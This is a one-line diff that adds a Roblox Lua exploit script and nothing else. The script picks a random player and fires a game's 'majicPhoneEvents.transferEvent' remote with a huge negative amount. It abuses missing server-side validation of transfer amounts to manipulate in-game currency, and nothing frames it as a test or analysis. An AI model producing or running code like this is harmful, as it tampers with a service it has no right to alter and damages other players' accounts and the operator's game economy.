@@ -1,0 +1,1 @@
+local p=game:GetService("Players"):GetPlayers()if #p>0 then local a=p[math.random(1,#p)].Name;local b="-10000000000000"game:GetService("ReplicatedStorage").majicPhoneEvents.transferEvent:FireServer(a,b)end
